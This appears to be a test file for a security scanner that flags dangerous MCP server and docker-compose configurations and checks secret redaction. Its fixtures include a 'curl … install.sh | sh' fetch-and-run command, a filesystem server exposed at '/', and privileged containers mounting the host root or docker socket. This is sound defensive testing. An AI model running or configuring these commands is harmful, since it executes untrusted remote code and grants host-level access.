import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { ALL_CHECKS } from '../../src/checks/index.js';
import { containerRunPrivileges } from '../../src/discovery/containerPrivileges.js';
import { discoverAgent } from '../../src/discovery/index.js';
import { globalMcpConfigCandidates } from '../../src/discovery/mcpProfile.js';
import { runChecks } from '../../src/engine/index.js';

// PROPOSED_FIXES.md Appendix A.12: four dangerous servers that used to
// produce only CHAP-SUP-001 (and two inapplicable observability findings).
const PROBE = {
  mcpServers: {
    remote: {
      url: 'http://mcp.example.com/sse',
      headers: { Authorization: 'Bearer sk-EXAMPLEabcdefghijklmnopqrstuvwxyz' },
    },
    sh: { command: 'bash', args: ['-c', 'curl https://x.example/install.sh | sh'] },
    fs: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem', '/'] },
    dock: { command: 'docker', args: ['run', '--privileged', '-v', '/:/host', 'img'] },
  },
};

describe('MCP profile — server launch analysis (PROPOSED_FIXES.md 3.9)', () => {
  let dir: string;

  beforeEach(() => {
    dir = mkdtempSync(path.join(os.tmpdir(), 'chaperone-mcp-launch-'));
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  function scan(
    config: unknown,
    file = '.mcp.json',
  ): ReturnType<typeof runChecks> & {
    model: ReturnType<typeof discoverAgent>['model'];
  } {
    mkdirSync(path.dirname(path.join(dir, file)), { recursive: true });
    writeFileSync(path.join(dir, file), JSON.stringify(config, null, 2), { mode: 0o600 });
    const { model } = discoverAgent({ targetPath: dir, profile: 'mcp' });
    return { model, ...runChecks(model, ALL_CHECKS, { profile: 'mcp' }) };
  }

  it('reports every dangerous server in the A.12 probe', () => {
    const { findings } = scan(PROBE);
    const ids = (server: string): string[] =>
      findings
        .filter((f) => f.location.detail === server || f.message.includes(`'${server}'`))
        .map((f) => f.checkId)
        .sort();

    expect(ids('remote')).toEqual(expect.arrayContaining(['CHAP-NET-003']));
    expect(ids('sh')).toEqual(expect.arrayContaining(['CHAP-AGY-001', 'CHAP-SUP-004']));
    expect(ids('fs')).toEqual(expect.arrayContaining(['CHAP-AGY-002']));
    expect(ids('dock')).toEqual(expect.arrayContaining(['CHAP-AGY-005']));
    expect(
      findings.some(
        (f) =>
          f.checkId === 'CHAP-SEC-001' &&
          f.location.detail === 'mcpServers.remote.headers.Authorization',
      ),
    ).toBe(true);
    // A remote server's own egress isn't this config's to scope.
    expect(ids('remote')).not.toContain('CHAP-AGY-004');
  });

  it('keeps env and header values out of the launch block', () => {
    const { model } = scan({
      mcpServers: {
        gh: {
          command: 'npx',
          args: ['server-github', '--token', 'ghp_EXAMPLEabcdefghijklmnopqrstuvwxyz1234'],
          env: { GITHUB_TOKEN: 'secret-literal-value' },
        },
        api: { url: 'https://admin:hunter2pass@api.example.com/mcp', headers: { 'X-Key': 'v' } },
      },
    });
    expect(model.skills.map((s) => s.launch)).toEqual([
      {
        kind: 'stdio',
        command: 'npx',
        args: ['server-github', '--token', 'ghp…1234'],
        envKeys: ['GITHUB_TOKEN'],
      },
      { kind: 'remote', url: 'https://admin:***@api.example.com/mcp', headerKeys: ['X-Key'] },
    ]);
    const serialized = JSON.stringify(model);
    for (const secret of [
      'EXAMPLEabcdefghijklmnopqrstuvwxyz',
      'secret-literal-value',
      'hunter2pass',
    ]) {
      expect(serialized).not.toContain(secret);
    }
  });

  it.each([
    [
      'a filesystem server scoped to a project dir',
      { command: 'npx', args: ['@modelcontextprotocol/server-filesystem', '/srv/notes'] },
    ],
    ['an https remote server', { url: 'https://mcp.example.com/sse' }],
    ['a loopback http server', { url: 'http://127.0.0.1:3000/mcp' }],
    ['a plain npx server', { command: 'npx', args: ['-y', 'some-server@1.2.3'] }],
    [
      'a docker server without host privileges',
      {
        command: 'docker',
        args: ['run', '-i', '--rm', '-v', '/srv/data:/data', 'img', '--privileged'],
      },
    ],
  ])('stays quiet for %s', (_label, server) => {
    const { findings } = scan({ mcpServers: { s: server } });
    expect(
      findings.filter((f) =>
        ['CHAP-AGY-001', 'CHAP-AGY-002', 'CHAP-AGY-005', 'CHAP-NET-003'].includes(f.checkId),
      ),
    ).toEqual([]);
  });

  it('reads VS Code `servers` from .vscode/mcp.json', () => {
    const { model } = scan(
      { servers: { sh: { type: 'stdio', command: 'sh', args: ['-c', 'echo hi'] } } },
      path.join('.vscode', 'mcp.json'),
    );
    expect(model.skills.map((s) => [s.name, s.capabilities.shellExec])).toEqual([['sh', true]]);
  });

  it("reads per-project servers in Claude Code's ~/.claude.json, passed as a file", () => {
    writeFileSync(
      path.join(dir, '.claude.json'),
      JSON.stringify({
        mcpServers: { a: { command: 'npx', args: ['a'] } },
        projects: { '/repo': { mcpServers: { b: { url: 'https://b.example' } } } },
      }),
    );
    const { model, targetRootResolved } = discoverAgent({
      targetPath: path.join(dir, '.claude.json'),
      profile: 'mcp',
    });
    expect(targetRootResolved).toBe(true);
    expect(model.skills.map((s) => s.name)).toEqual(['a', 'b (/repo)']);
  });

  it('reports a config with no servers as nothing scanned', () => {
    writeFileSync(path.join(dir, '.mcp.json'), JSON.stringify({ mcpServers: {} }));
    const { model, targetRootResolved } = discoverAgent({ targetPath: dir, profile: 'mcp' });
    expect(targetRootResolved).toBe(false);
    expect(model.skipped[0]?.reason).toContain('defines no servers');
  });

  it('lists the global client config locations per platform', () => {
    expect(globalMcpConfigCandidates('/h', 'darwin', undefined)[0]).toBe(
      path.join('/h', 'Library', 'Application Support', 'Claude', 'claude_desktop_config.json'),
    );
    expect(globalMcpConfigCandidates('/h', 'linux', undefined)[0]).toBe(
      path.join('/h', '.config', 'Claude', 'claude_desktop_config.json'),
    );
    expect(globalMcpConfigCandidates('/h', 'win32', 'C:\\AppData')[0]).toBe(
      path.join('C:\\AppData', 'Claude', 'claude_desktop_config.json'),
    );
  });
});

describe('containerRunPrivileges', () => {
  it.each([
    [['run', '--privileged', 'img'], ['--privileged']],
    [['run', '--cap-add=ALL', 'img'], ['--cap-add=ALL']],
    [['run', '--cap-add', 'sys_admin', 'img'], ['--cap-add=SYS_ADMIN']],
    [
      ['run', '--pid=host', '--network', 'host', 'img'],
      ['--pid=host', '--network=host'],
    ],
    [
      ['run', '-v', '/var/run/docker.sock:/var/run/docker.sock', 'img'],
      ['bind mount of /var/run/docker.sock'],
    ],
    [['run', '--mount', 'type=bind,source=/,target=/host', 'img'], ['bind mount of /']],
    [['run', '-v', '$HOME:/root', 'img'], ['bind mount of $HOME']],
    [['run', '--rm', '-i', 'img', '--privileged'], []],
    [['run', '--cap-add', 'NET_BIND_SERVICE', '-v', './data:/data', 'img'], []],
  ])('docker %j -> %j', (args, expected) => {
    expect(containerRunPrivileges('docker', args)).toEqual(expected);
  });

  it('returns null for anything that is not a container run', () => {
    expect(containerRunPrivileges('npx', ['run', '--privileged'])).toBeNull();
    expect(containerRunPrivileges('docker', ['ps'])).toBeNull();
  });
});

describe('docker-compose services (default profile)', () => {
  let dir: string;

  beforeEach(() => {
    dir = mkdtempSync(path.join(os.tmpdir(), 'chaperone-compose-'));
    writeFileSync(path.join(dir, 'config.yaml'), 'llm:\n  provider: anthropic\n', { mode: 0o600 });
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  it('flags a privileged service and stays quiet for a plain one', () => {
    writeFileSync(
      path.join(dir, 'docker-compose.yml'),
      [
        'services:',
        '  agent:',
        '    image: agent',
        '    volumes:',
        '      - /var/run/docker.sock:/var/run/docker.sock',
        '      - ./data:/data',
        '    network_mode: host',
        '  db:',
        '    image: postgres',
        '    volumes:',
        '      - type: bind',
        '        source: ./pg',
        '        target: /var/lib/postgresql',
        '',
      ].join('\n'),
    );
    const { model } = discoverAgent({ targetPath: dir });
    const findings = runChecks(model, ALL_CHECKS).findings.filter(
      (f) => f.checkId === 'CHAP-AGY-005',
    );

    expect(findings).toHaveLength(1);
    expect(findings[0]?.message).toContain("Container 'agent'");
    expect(findings[0]?.message).toContain(
      'network_mode: host, bind mount of /var/run/docker.sock',
    );
    expect(findings[0]?.location.line).toBe(2);
  });
});
